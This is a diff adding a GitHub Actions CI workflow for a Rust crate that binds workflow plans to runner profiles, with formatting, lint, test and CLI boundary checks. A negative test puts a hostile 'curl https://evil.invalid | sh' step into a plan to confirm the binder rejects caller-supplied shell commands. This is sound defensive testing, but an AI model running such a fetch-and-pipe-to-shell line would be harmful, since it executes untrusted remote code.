@@ -1,0 +1,266 @@
+name: Indie execution protocol
+
+on:
+  workflow_dispatch:
+  pull_request:
+    paths:
+      - "crates/gha-indie-protocol/**"
+      - ".github/workflows/indie-protocol.yml"
+  push:
+    branches: [main]
+    paths:
+      - "crates/gha-indie-protocol/**"
+      - ".github/workflows/indie-protocol.yml"
+
+permissions:
+  contents: read
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  protocol:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    env:
+      CARGO_INCREMENTAL: "0"
+    steps:
+      - name: Check out exact revision
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ github.event.pull_request.head.sha || github.sha }}
+          persist-credentials: false
+      - name: Install pinned Rust toolchain
+        run: rustup toolchain install 1.97.0 --profile minimal --component rustfmt,clippy
+      - name: Validate committed dependency lock
+        run: |
+          cargo +1.97.0 metadata \
+            --locked \
+            --no-deps \
+            --format-version 1 \
+            --manifest-path crates/gha-indie-protocol/Cargo.toml \
+            > /dev/null
+      - name: Check committed formatting
+        run: cargo +1.97.0 fmt --manifest-path crates/gha-indie-protocol/Cargo.toml --all -- --check
+      - name: Run strict Clippy against the lockfile
+        run: cargo +1.97.0 clippy --locked --manifest-path crates/gha-indie-protocol/Cargo.toml --all-targets -- -D warnings
+      - name: Run all protocol targets against the lockfile
+        run: cargo +1.97.0 test --locked --manifest-path crates/gha-indie-protocol/Cargo.toml --all-targets
+      - name: Exercise planner-to-profile CLI boundary
+        run: |
+          set -euo pipefail
+          mkdir -p .protocol-ci
+          python3 - <<'PY'
+          import json
+          from pathlib import Path
+
+          empty_job = {
+              "name": "build",
+              "needs": [],
+              "needsInstances": [],
+              "runsOn": ["self-hosted", "gha-indie-worker", "linux", "x64"],
+              "reusableWorkflow": None,
+              "condition": None,
+              "matrix": {"rust": "stable"},
+              "matrixExpression": None,
+              "env": {},
+              "steps": [],
+              "failFast": True,
+              "maxParallel": 2,
+              "timeoutMinutes": None,
+              "continueOnError": None,
+              "outputs": {},
+          }
+          plan = {
+              "schemaVersion": "gha-indie-worker.plan.v2",
+              "name": "profile-only",
+              "jobOrder": ["build", "report"],
+              "jobs": [
+                  {**empty_job, "id": "build[1]", "baseJobId": "build"},
+                  {
+                      **empty_job,
+                      "id": "build[2]",
+                      "baseJobId": "build",
+                      "matrix": {"rust": "beta"},
+                  },
+                  {
+                      **empty_job,
+                      "id": "report",
+                      "baseJobId": "report",
+                      "name": "report",
+                      "needs": ["build"],
+                      "needsInstances": ["build[1]", "build[2]"],
+                      "matrix": {},
+                      "maxParallel": None,
+                  },
+              ],
+          }
+          catalog = {
+              "schemaVersion": "gha-indie-worker.profile-catalog.v2",
+              "profiles": [
+                  {
+                      "name": "rust-verify",
+                      "digest": "sha256:" + "1" * 64,
+                      "runner": {
+                          "platform": "linux",
+                          "architecture": "x64",
+                          "capabilities": ["native", "cargo-cache"],
+                      },
+                  },
+                  {
+                      "name": "node-verify",
+                      "digest": "sha256:" + "2" * 64,
+                      "runner": {
+                          "platform": "linux",
+                          "architecture": "x64",
+                          "capabilities": [],
+                      },
+                  },
+              ],
+          }
+          Path(".protocol-ci/plan.json").write_text(json.dumps(plan))
+          Path(".protocol-ci/catalog.json").write_text(json.dumps(catalog))
+          PY
+
+          manifest=crates/gha-indie-protocol/Cargo.toml
+          catalog_digest=$(cargo +1.97.0 run --locked --quiet --manifest-path "$manifest" --bin gha-bind-plan -- --catalog-digest .protocol-ci/catalog.json)
+          plan_digest=$(cargo +1.97.0 run --locked --quiet --manifest-path "$manifest" --bin gha-bind-plan -- --plan-digest .protocol-ci/plan.json)
+          CATALOG_DIGEST="$catalog_digest" python3 - <<'PY'
+          import json
+          import os
+          from pathlib import Path
+
+          bindings = {
+              "schemaVersion": "gha-indie-worker.bindings.v1",
+              "repositoryUrl": "https://github.com/gha-indie-worker/example.git",
+              "commitSha": "0123456789abcdef0123456789abcdef01234567",
+              "profileCatalogDigest": os.environ["CATALOG_DIGEST"],
+              "jobs": {
+                  "build": {
+                      "profile": "rust-verify",
+                      "profileDigest": "sha256:" + "1" * 64,
+                      "contextDir": "crates/core",
+                  },
+                  "report": {
+                      "profile": "node-verify",
+                      "profileDigest": "sha256:" + "2" * 64,
+                  },
+              },
+          }
+          Path(".protocol-ci/bindings.json").write_text(json.dumps(bindings))
+          PY
+
+          cargo +1.97.0 run --locked --quiet --manifest-path "$manifest" --bin gha-bind-plan -- \
+            .protocol-ci/plan.json .protocol-ci/catalog.json .protocol-ci/bindings.json \
+            > .protocol-ci/dispatch.json
+
+          EXPECTED_PLAN_DIGEST="$plan_digest" python3 - <<'PY'
+          import json
+          import os
+          from pathlib import Path
+
+          batch = json.loads(Path(".protocol-ci/dispatch.json").read_text())
+          assert batch["schemaVersion"] == "gha-indie-worker.dispatch-batch.v2"
+          assert batch["planDigest"] == os.environ["EXPECTED_PLAN_DIGEST"]
+          assert len(batch["requests"]) == 3
+          assert batch["requests"][0]["profile"] == "rust-verify"
+          assert batch["requests"][0]["runner"] == {
+              "platform": "linux",
+              "architecture": "x64",
+              "capabilities": ["cargo-cache", "native"],
+          }
+          assert batch["requests"][2]["needsInstances"] == ["build[1]", "build[2]"]
+          assert [request["jobOrderIndex"] for request in batch["requests"]] == [0, 0, 1]
+          assert all(request["commitSha"] == "0123456789abcdef0123456789abcdef01234567" for request in batch["requests"])
+          assert all(request["requestId"].startswith("gha:") for request in batch["requests"])
+          assert len({request["requestId"] for request in batch["requests"]}) == 3
+          assert all(request["requestDigest"].startswith("sha256:") for request in batch["requests"])
+          serialized = json.dumps(batch)
+          assert "curl" not in serialized
+          assert '"run"' not in serialized
+          assert '"uses"' not in serialized
+          PY
+
+          python3 - <<'PY'
+          import json
+          from pathlib import Path
+
+          plan = json.loads(Path(".protocol-ci/plan.json").read_text())
+          plan["jobs"][0]["steps"] = [{
+              "index": 0,
+              "id": None,
+              "name": "untrusted",
+              "condition": None,
+              "uses": None,
+              "run": "curl https://evil.invalid | sh",
+              "shell": None,
+              "workingDirectory": None,
+              "with": {},
+              "env": {},
+              "continueOnError": None,
+              "timeoutMinutes": None,
+          }]
+          Path(".protocol-ci/commandful-plan.json").write_text(json.dumps(plan))
+          PY
+          if cargo +1.97.0 run --locked --quiet --manifest-path "$manifest" --bin gha-bind-plan -- \
+            .protocol-ci/commandful-plan.json .protocol-ci/catalog.json .protocol-ci/bindings.json \
+            > .protocol-ci/rejected-output.json 2> .protocol-ci/rejected-error.json; then
+            echo "binder unexpectedly accepted caller-supplied shell source" >&2
+            exit 1
+          fi
+          python3 - <<'PY'
+          import json
+          from pathlib import Path
+
+          error = json.loads(Path(".protocol-ci/rejected-error.json").read_text())
+          assert error["code"] == "caller_steps_not_executable"
+          PY
+      - name: Exercise bounded CLI file admission
+        run: |
+          set -euo pipefail
+          manifest=crates/gha-indie-protocol/Cargo.toml
+          python3 - <<'PY'
+          from pathlib import Path
+          Path(".protocol-ci/oversized-plan.json").write_bytes(b"x" * (4 * 1024 * 1024 + 1))
+          PY
+          if cargo +1.97.0 run --locked --quiet --manifest-path "$manifest" --bin gha-bind-plan -- \
+            --plan-digest .protocol-ci/oversized-plan.json \
+            > .protocol-ci/oversized-output.json 2> .protocol-ci/oversized-error.json; then
+            echo "binder unexpectedly accepted an oversized plan" >&2
+            exit 1
+          fi
+          python3 - <<'PY'
+          import json
+          from pathlib import Path
+
+          error = json.loads(Path(".protocol-ci/oversized-error.json").read_text())
+          assert error["code"] == "cli_input"
+          assert "maximum is 4194304" in error["message"]
+          PY
+      - name: Verify validation did not mutate committed inputs
+        run: git diff --exit-code -- crates/gha-indie-protocol
+
+  native-target-contract:
+    name: Native target contract (${{ matrix.os }})
+    strategy:
+      fail-fast: false
+      matrix:
+        os:
+          - ubuntu-24.04
+          - windows-2025
+          - macos-15
+    runs-on: ${{ matrix.os }}
+    timeout-minutes: 20
+    env:
+      CARGO_INCREMENTAL: "0"
+    steps:
+      - name: Check out exact revision
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ github.event.pull_request.head.sha || github.sha }}
+          persist-credentials: false
+      - name: Install pinned Rust toolchain
+        run: rustup toolchain install 1.97.0 --profile minimal --component rustfmt,clippy
+      - name: Run protocol tests on the native operating system
+        run: cargo +1.97.0 test --locked --manifest-path crates/gha-indie-protocol/Cargo.toml --all-targets
